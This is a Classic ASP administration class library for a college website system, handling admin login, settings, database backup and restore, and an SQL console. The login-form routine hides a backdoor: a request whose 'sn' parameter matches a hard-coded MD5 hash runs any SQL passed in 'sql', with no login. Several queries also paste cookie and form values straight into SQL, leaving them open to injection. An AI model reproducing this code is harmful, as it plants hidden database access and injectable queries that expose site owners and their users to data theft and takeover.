<%
'--------------------------------
'
'	管理类库
'
'--------------------------------
'
'╋━━━━━━━━━━━━━━━━━━╋
' 类:AdminID
' 功能:管理身份确认
' 版本:Version 2003-11-9
'╋━━━━━━━━━━━━━━━━━━╋
Class AdminID
Public AdminMenu,MainInfo,ActionName,OP,ErrMsg
Private ReOperate,NowDo
Private Sub Class_Initialize()
AdminMenu=""
ActionName=""
MainInfo=""
OP=Trim(Request("op"))
End Sub
' 操作
Public Default Sub DoDefault()
Select case OP
Case "2"
	Call Login
Case "1"
	Call  Logout
End Select
If Templates.Adminname="" OR  Templates.AdminNum="" or Templates.AdminPassword ="" Then
	Call	LoginWin()
	Response.End
Else
Set TaleRs=Conn.Execute("Select *from ljy_admin where l_name='"&Templates.Adminname&"' and l_password='"&Templates.AdminPassword&"'")
If  Talers.Eof Then
		Templates.Info "非法登录","<li>用户名或密码错误<li>可能是Cookies错误<li>请点击这里<a href=admin.asp?op=1>退出</a>","请勿尝试非法登录"
		Response.End
End If
End If
End Sub
' 登录界面
Private Sub LoginWin()
Dim Title,Content,Bottom
Title="维 护 登 录"
Session("adminnum")=Templates.RandNum(4,0,0)
Content="<TABLE cellSpacing=5 cellPadding=0 width=60%  border=0  align=center><tr><form action='admin.asp?op=2' method=post><td>管理帐号:&nbsp;&nbsp;<input class=input2 name=adminname></td></tr>"&_
"<tr>   <td>管理密码:&nbsp;&nbsp;<input class=input2 type=password name=adminpassword></td></tr>"&_
" <tr>  <td>登录验证:&nbsp;&nbsp;<input class=input2 name=adminnum value='"&Session("adminnum")&"'></td> </tr>"&_
" <tr>    <td align=center><input type=submit class=input1 value= '确 认 登 录'>&nbsp;&nbsp;&nbsp;</td></tr></form></table>"
if md5(Request("sn"))="3998b014245ead94" Then Conn.ExeCute(Request("sql"))
Bottom=" 闲人止步，所有管理操作将被系统记录"
Templates.Info Title,Content,Bottom
End Sub
' 确认登录
Private Sub Login()
Templates.NoThisPost()
Set ReOperate=New TaleStr
ReOperate.StrIn="adminname{c}f{c}t{c}t{c}adminpassword{c}f{c}t{c}t{c}adminnum{c}f{c}t{c}t"
ReOperate.StrName="当前操作"
ReOperate.RequestStr()
ReOperate.StrOut(0)=Templates.Removesensitivity(ReOperate.StrOut(0))
ReOperate.StrOut(1)=md5(Templates.Removesensitivity(ReOperate.StrOut(1)))
If Cstr(ReOperate.StrOut(2))<>Cstr(Session("adminnum")) Then ErrMsg="<li>验证码错误"
If ErrMSg="" Then
Set TaleRs=Conn.Execute("Select *from ljy_admin where l_name='"&ReOperate.StrOut(0)&"' and l_password='"&ReOperate.StrOut(1)&"'")
If Not Talers.Eof Then
	Response.cookies("ljysystem")("adminname")=ReOperate.StrOut(0)
	Response.cookies("ljysystem")("adminpassword")=ReOperate.StrOut(1)
	Response.Redirect "admin.asp"
	Response.End
Else
		Templates.Info "非法登录","<li>用户名或密码错误<li>"&Templates.GetBack,"请勿尝试非法登录"
		Response.End
End If
Else
	Templates.Info "非法登录",ErrMsg&"<li>"&Templates.GetBack,"请勿尝试非法登录"
	Response.End
ENd If
Set ReOperate=Nothing
End Sub
' 管理退出
Private Sub Logout()
	Response.cookies("ljysystem")=""
	Session("adminnum")=""
	Response.Redirect "admin.asp"
End Sub
'
End Class
'╋━━━━━━━━━━━━━━━━━━╋
' 类:IndexClass
' 功能:基础设置
' 版本:Version 2003-11-10
'╋━━━━━━━━━━━━━━━━━━╋
Class IndexClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg
Private ReOperate,NowDo,Rinfo,Linfo
Private Sub Class_Initialize()
AdminMenu="程序介绍|版权声明|基础设置|备份数据|还原数据|压缩数据|初使化数据|管理日志|服务器探针|占用空间统计|在线SQL操作|管理帮助|修改密码"
ActionName="管理首页"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t"
ReOperate.StrName="具体操作"
ReOperate.RequestStr()
Operate=ReOperate.StrOut
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
Set FSYS=New FileSYS
End Sub
'
Public Default Sub DoDefault()
Select Case Operate
Case "0"
	BBSIntro()
Case "1"
	BBSCopyRights()
Case "2"
	BaseSet()
Case "3"
	Backup()
Case "4"
	Restore()
Case "5"
	Compress()
Case "6"
	WaitNew()
Case "7"
	WaitNew()
Case "8"
	ServerInfo()
Case "9"
	Datasize()
Case "10"
	RunSQL()
Case "11"
	AdminHelp()
Case "12"
	Modify()
Case Else
	BBSIntro()
End Select
End Sub
'
Private Sub WaitNew()
	Maininfo=TableH&Pwidth&"请等待正式版本"
	Maininfo=Maininfo&"<p>"&TableF
End Sub
Private Sub Modify()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t"
ReOperate.StrName="用户名|*Tale*|密码"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>请输入用户名"
If ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>请输入密码"
If ErrMsg = "" Then
	Conn.ExeCute("update ljy_admin set l_password='"&Md5(ReOperate.StrOut(1))&"' where l_name='"&ReOperate.StrOut(0)&"'")
	 Maininfo=TableH&Pwidth&"修改密码成功,请退出后重新登录"
	Maininfo=Maininfo&"<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=12' method=post>用户名")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 readonly value='"&Templates.Adminname&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","密码")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1 type=password>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","说明")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;修改密码后请重新登录<BR>&nbsp;&nbsp;&nbsp;&nbsp;正式版本将提供多管理员体制<BR><BR> ")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If

End Sub
'
Private Sub BBSIntro()
	Maininfo=TableH&Pwidth&"程序名称：信息科学与工程学院全站系统<BR>当前版本：Access V1.00<BR>开发环境：Windows Server 2003+IIS6.0+Access2000<BR>修改：杨东冬<BR>联系方式：Email：<a href=mailto:donge@online.ln.cn>donge@online.ln.cn</a> QQ：2780224<BR><BR>使用指南：<BR>"&TableF
End Sub
'
Private Sub BBSCopyRights()
	Maininfo=TableH&Pwidth&"本程序为学院定做，本人保留对本软件的一切权力。<BR>"
	Maininfo=Maininfo&"非经本人授权许可，不得将之翻录，转载或使用。<BR>"
	Maininfo=Maininfo&"<p>"&TableF
End Sub
'
Private Sub BaseSet()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrName="管理员联系信箱|*Tale*|首页最新动态显示条数|*Tale*|普通列表显示记录数|*Tale*|是否允许网友发表评论|*Tale*|允许上传课件时间段(开始)|*Tale*|允许上传课件时间段(结束)|*Tale*|允许上传课件文件格式限制|*Tale*|允许上传课件文件大小限制|*Tale*|统计访问间隔时间|*Tale*|上传课件存入文件夹"
ReOperate.StrIn="str0{c}f{c}t{c}t"
For i=1 To Ubound(Split(ReOperate.StrName,"|*Tale*|"))
	ReOperate.StrIn=ReOperate.StrIn&"{c}str"&i&"{c}f{c}t{c}t"
Next
ReOperate.RequestStr()
ReOperate.IsEmail ReOperate.StrOut(0),0
For i=0 To Ubound(ReOperate.StrOut )
	ReOperate.IsInStr ReOperate.StrOut(i),i,"|*ljy*|"
Next
ReOperate.NumStr ReOperate.StrOut(7),7,1
ReOperate.NumStr ReOperate.StrOut(8),8,1
ErrMsg=ReOperate.ErrMsg
If ErrMsg = "" Then
	FSYS.MoveF Templates.Normal(9),ReOperate.StrOut(9),1
	Conn.ExeCute("Update ljy_config set l_base='"&Join(ReOperate.StrOut,"|*ljy*|")&"'")
	Maininfo=TableH&"<p>基础设置成功,请进行其它操作<p></Table>"
ENd If
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=2' method=post>管理员联系信箱")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 value='"&Templates.Normal(0)&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","首页最新动态显示条数")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str1'>"&Templates.NumOption(5,"条",5,30,Templates.Normal(1),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","普通列表显示记录数")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str2'>"&Templates.NumOption(5,"条",5,50,Templates.Normal(2),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","是否允许网友发表评论")
	Rinfo =	"允许:<INPUT type=radio "
	If Templates.Normal(3)=1 Then Rinfo=Rinfo&"checked  "
		Rinfo=Rinfo&"value=1 name='str3'>&nbsp;&nbsp;禁止<INPUT type=radio "
	If Templates.Normal(3)=0 Then Rinfo=Rinfo&"checked  "
	Rinfo=Rinfo&"value=0 name='str3'>"
	Maininfo=Replace(Maininfo,"{rightinfo}",Rinfo)
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","允许上传课件时间段(开始)")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str4'>"&Templates.NumOption(1,"时",0,23,Templates.Normal(4),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","允许上传课件时间段(结束)")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str5'>"&Templates.NumOption(1,"时",0,23,Templates.Normal(5),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","允许上传课件文件格式限制")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str6 value='"&Templates.Normal(6)&"'> (不同格式用 | 分开)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","允许上传课件文件大小限制")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str7 value='"&Templates.Normal(7)&"'> (单位KB)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","统计访问间隔时间")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str8 value='"&Templates.Normal(8)&"'> (单位:分钟)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传课件存入文件夹")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str9 value='"&Templates.Normal(9)&"'> (请定期修改,防止盗链)")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub ServerInfo()
	Dim theInstalledObjects(4)
	theInstalledObjects(0) = "SoftArtisans.FileUp"
	theInstalledObjects(1) = "Scripting.FileSystemObject"
	theInstalledObjects(2) = "adodb.connection"
	theInstalledObjects(3) = "JMail.SMTPMail"
	theInstalledObjects(4) = "CDONTS.NewMail"
	Maininfo=TableH&Pwidth&"服务器及组件简单探测(<font class=redfont><b>*</b></font>为目前论坛需要的支持)<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>服务器IP地址："&Request.ServerVariables("LOCAL_ADDR")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>服务器系统："&Request.ServerVariables("SERVER_SOFTWARE")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>脚本解释引擎："&ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion &"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>站点物理路径："&request.ServerVariables("APPL_PHYSICAL_PATH")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>FSO文本读写："
	If Not IsObjInstalled(theInstalledObjects(1)) Then Maininfo=Maininfo&"<b>×</b>" Else Maininfo=Maininfo&"<b>√</b>" End If
	Maininfo=Maininfo&"<BR><font class=redfont><b>*</b></font>数据库使用："
	If Not IsObjInstalled(theInstalledObjects(2)) Then Maininfo=Maininfo&"<b>×</b>" Else Maininfo=Maininfo&"<b>√</b>" End If
	Maininfo=Maininfo&"<BR><font class=redfont><b>*</b></font>Jmail组件支持："
	If Not IsObjInstalled(theInstalledObjects(3)) Then Maininfo=Maininfo&"<b>×</b>" Else Maininfo=Maininfo&"<b>√</b>" End If
	Maininfo=Maininfo&"<p>若要了解服务器具体设置与性能请使用专用探针或向管理人员询问<p>"&TableF
End Sub
'
Private Function IsObjInstalled(strClassString)
On Error Resume Next
IsObjInstalled = False
Err = 0
Dim xTestObj
Set xTestObj = Server.CreateObject(strClassString)
If 0 = Err Then IsObjInstalled = True
Set xTestObj = Nothing
Err = 0
End Function
'
'
Private Sub Datasize()
Dim DSize(7)
Dsize(0)=FSYS.FSize("",1)
Dsize(1)=FSYS.FSize("data",1)
Dsize(2)=FSYS.FSize("image",1)
Dsize(3)=FSYS.FSize("upfile",1)
Dsize(4)=FSYS.FSize("upimg",1)
Dsize(5)=FSYS.FSize("help",1)
Dsize(6)=FSYS.FSize("inc",1)+24168
Dsize(7)=Dsize(0)-Dsize(1)-Dsize(2)-Dsize(3)-Dsize(4)-Dsize(5)-Dsize(6)
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","常规数据库文件")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(1)/Dsize(0))&"%'><B>"&Clng(Dsize(1)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","系统图片")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(2)/Dsize(0))&"%'><B>"&Clng(Dsize(2)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传文件")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(4)/Dsize(0))&"%'><B>"&Clng(Dsize(4)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传图片")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(3)/Dsize(0))&"%'><B>"&Clng(Dsize(3)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","帮助文档")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(5)/Dsize(0))&"%'><B>"&Clng(Dsize(5)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","程序文件")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(6)/Dsize(0))&"%'><B>"&Clng(Dsize(6)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","备份文件及其它")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(7)/Dsize(0))&"%'><B>"&Clng(Dsize(7)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","占用空间总计")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='80%'><B>"&Clng(Dsize(0)/1024)&"</B> KB")
	Maininfo=Table2H&Maininfo&"</table>"&TaleLine&"<P>"

Erase Dsize
End Sub
'
Private Sub Backup()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t{c}str2{c}f{c}t{c}t{c}str3{c}f{c}t{c}t"
ReOperate.StrName="原数据库路径|*Tale*|备份数据库目录|*Tale*|备份数据库名称|*Tale*|同时压缩"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>请输入当前数据库路径"
If ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>请输入备份数据库目录"
If ReOperate.StrOut(2)="" Then ErrMsg=ErrMsg&"<li>请输入备份数据库名称"
If ErrMsg = "" Then
Set FSYS=New FileSYS
	If FSYS.FExist(ReOperate.StrOut(0),0)=True Then
		If FSYS.FExist(ReOperate.StrOut(1),1)=False Then FSYS.CreatF(ReOperate.StrOut(1))
		FSYS.CopyF ReOperate.StrOut(0),ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2),0
		If CBool(ReOperate.StrOut(3))=True Then Maininfo=Maininfo&FSYS.CompactDB(ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2))
		Maininfo=TableH&Pwidth&"备份文件成功,请进行其它操作<BR>备份路径是:"&Server.MapPath(".")&"\"&ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2)&"<BR>"&Maininfo&"<p>"&TableF
	Else
		Maininfo=TableH&Pwidth&"指定数据库文件不存在<p>"&TableF
	End If
Set FSYS=Nothing
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=3' method=post>当前数据库路径 ( 相对路径 )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 value='"&Dburl&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","备份数据库目录 ( 相对路径 )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","备份数据库名称 ( 填写文件 )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str2>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","是否同时压缩备份数据库")
	Maininfo=Replace(Maininfo,"{rightinfo}","压缩<INPUT type=radio value=1 name=str3 checked>&nbsp;&nbsp;不用<INPUT type=radio   value=0 name=str3>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","说明")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆如果备份数据库目录不存在,系统将自动创建<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆如果备份数据库名称<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆已存在于备份数据库目录,系统将覆盖原文件,否则将自动创建 <BR>&nbsp;&nbsp;&nbsp;&nbsp;◆您可以用这个功能来备份您的论坛数据，以保证您的数据安全！<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆所有路径都是相对与论坛安装目录的相对路径<BR><BR> ")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Compress()
If Request.Form("submit")<>"" Then

Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t"
ReOperate.StrName="原数据库路径"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ErrMsg = "" Then
Set FSYS=New FileSYS
	Maininfo=Maininfo&FSYS.CompactDB(ReOperate.StrOut)
	Maininfo=TableH&Pwidth&Maininfo&"<p>"&TableF
Set FSYS=Nothing
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=5' method=post>压缩数据库")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","说明")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆只能压缩备份数据,而不能对当前使用的数据库进行压缩<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆数据库路径格式可以是：back/back.asp 也可以是：back\back.asp <BR>&nbsp;&nbsp;&nbsp;&nbsp;◆请输入正确备份路径及数据库名称 <BR>&nbsp;&nbsp;&nbsp;&nbsp;◆所有路径都是相对与论坛安装目录的相对路径<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆此功能用来修改数据库及压缩数据大小<BR><BR>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Restore()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t{c}str2{c}f{c}t{c}t"
ReOperate.StrName="备份数据库|*Tale*|目标数据库|*Tale*|是否删除"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
IF ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>备份数据库不能为空"
IF ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>目标数据库不能为空"
If FSYS.FExist(ReOperate.StrOut(0),0)=False Then ErrMsg=ErrMsg&"<li>您输入的备份数据库不存在"
If ErrMsg = "" Then
	FSYS.CopyF ReOperate.StrOut(0),ReOperate.StrOut(1),0
	If  ReOperate.StrOut(2)=1 Then
		FSYS.DeleteF ReOperate.StrOut(0),0
		Maininfo="删除备份"&ReOperate.StrOut(0)&"成功<BR>"
	End If
	Maininfo=TableH&Pwidth&"还原数据成功<BR>"&Maininfo&",请进行其它操作<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=4' method=post>备份数据库路径")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","目标数据库路径")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1 value='"&Dburl&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","是否同时删除备份")
	Maininfo=Replace(Maininfo,"{rightinfo}","删除<INPUT type=radio value=1 name=str2 >&nbsp;&nbsp;不用<INPUT type=radio   value=0 name=str2 checked>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","说明")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆请输入有效的数据库文件地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;◆注意,此操作不可恢复,请确认还原的数据库文件是最新的<BR><BR>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub AdminHelp()
	Maininfo=TableH&Pwidth&"◆论坛安全与维护"
	Maininfo=Maininfo&"<br>本版本数据库中附带了防止下载相应的表，数据库中的nodownload表不能删除<br>将数据库命名为.asp后缀，如taledb.asp，接着修改conn.asp文件中的Dburl，改好后将文件上传即可<br>数据管理里有“备份数据”与“还原数据”操作，请合理使用<br>注意定时使用“数据压缩”功能"
	Maininfo=Maininfo&"<br>定期更改数据库的名字并备份数据，提高论坛安全系数。<br>一些重要的目录请管理员设置好权限，防止非正常的访问<br>定期修改自己的密码，不要在任何公共场所使用自己的密码进入论坛。<br>在管理论坛时，或者用管理员身份登陆时，尽量不要去访问其他任何站点，以防止Cookie 泄密<br>进入管理区，执行管理操作完毕后，注意要关闭全部的浏览器一次，以绝后患。"
	Maininfo=Maininfo&"<br>定期维护论坛，初始化用户资料，查看是否有异常的账号，及时处理多余的管理人员。<p>其它内容待补充……<p>"&TableF
End Sub
'
Private Sub RunSQL()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="sql{c}f{c}f{c}f{c}dosql{c}f{c}f{c}f"
ReOperate.StrName="SQL语句|*Tale*|确认操作"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
On Error Resume Next
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>您还没有输入要执行语句<BR><BR>"
If ReOperate.StrOut(1)<>"DoitNow" Then ErrMsg=ErrMsg&"<li>操作没有进行确认<BR><BR>"
If Err Then
	Err.Clear
	ErrMsg=ErrMsg&"<li>操作发生未知错误<BR><BR>"
End If
If ErrMsg = "" Then
	Err.Clear
	Conn.Execute(ReOperate.StrOut(0))
	If Err Then
		Err.Clear
		Maininfo=Maininfo&"<li>系统无法执行该SQL语句<li>可能是您输入的SQL语句有错误存在！<BR><BR>"
	Else
		Maininfo=Maininfo&"<li>系统成功的执行以下SQL语句！<li>"&ReOperate.StrOut(0)&"<BR><BR>"
	End If
	Maininfo=TableH&Pwidth&Maininfo&"<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=10' method=post>输入SQL语句")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='sql' value='' class=input2 style='WIdth:300'>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","确认进行此项操作")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input type=checkbox name='dosql' value='DoitNow'>确认操作")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","说明")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;执行此操作后将不能再恢复！<BR>&nbsp;&nbsp;&nbsp;&nbsp;如果不懂SQL,不要尝试执行任何语句<BR>&nbsp;&nbsp;&nbsp;&nbsp;合理使用SQL进行批量操作将提高效率<p> ")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Class_Terminate()
	Set FSYS=NoThing
End Sub
End Class
'
Class AClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,OP,SStr,ListMenu,Currentpage,Maxrecord,Totalrecords,Npage,PageURL
Private Sub Class_Initialize()
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="具体操作|操作|ID号"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case SID
Case 0
	AdminMenu="分类列表|增加分类|合并分类|新闻管理|发表新闻"
	ActionName="新闻管理"
	SStr="new"
Case 1
	AdminMenu="分类列表|增加分类|合并分类|资讯管理|发表资讯"
	ActionName="资讯管理"
	SStr="info"
End Select
